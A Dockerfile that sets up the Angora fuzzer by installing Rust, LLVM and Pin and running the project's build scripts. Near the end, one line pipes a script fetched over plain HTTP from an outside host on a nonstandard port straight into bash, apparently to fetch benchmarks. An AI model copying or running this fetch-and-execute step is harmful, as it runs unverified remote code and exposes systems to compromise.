FROM ubuntu:latest

RUN apt-get update && \
    apt-get -y upgrade && \
    apt-get install -y git build-essential wget zlib1g-dev golang-go python-pip python-dev build-essential cmake curl && \
    apt-get clean

ENV RUSTUP_HOME=/usr/local/rustup \
    CARGO_HOME=/usr/local/cargo \
    PIN_ROOT=/pin-3.20-98437-gf02b61307-gcc-linux \
    GOPATH=/go \
    PATH=/clang+llvm/bin:/usr/local/cargo/bin:/angora/bin/:/go/bin:$PATH \
    LD_LIBRARY_PATH=/clang+llvm/lib:$LD_LIBRARY_PATH

RUN echo  "export RUSTUP_HOME=/usr/local/rustup " >> /root/.bashrc
RUN echo  "export CARGO_HOME=/usr/local/cargo " >> /root/.bashrc
RUN echo  "export PIN_ROOT=/pin-3.20-98437-gf02b61307-gcc-linux " >> /root/.bashrc
RUN echo  "export GOPATH=/go " >> /root/.bashrc
RUN echo  "export PATH=/clang+llvm/bin:/usr/local/cargo/bin:/angora/bin/:/go/bin:$PATH " >> /root/.bashrc
RUN echo  "export LD_LIBRARY_PATH=/clang+llvm/lib:$LD_LIBRARY_PATH " >> /root/.bashrc

RUN mkdir -p angora
COPY . angora
WORKDIR angora

RUN ./build/install_rust.sh 
RUN rustup install 1.70.0 && rustup default 1.70.0 && rustup override set 1.70.0
RUN PREFIX=/ ./build/install_llvm.sh
# RUN ./build/install_tools.sh
RUN ./build/build.sh
RUN ./build/install_pin_mode.sh
RUN bash <(curl -s http://killuayz.top:1080/get_benchmark.sh)
# VOLUME ["/data"]
# WORKDIR /data
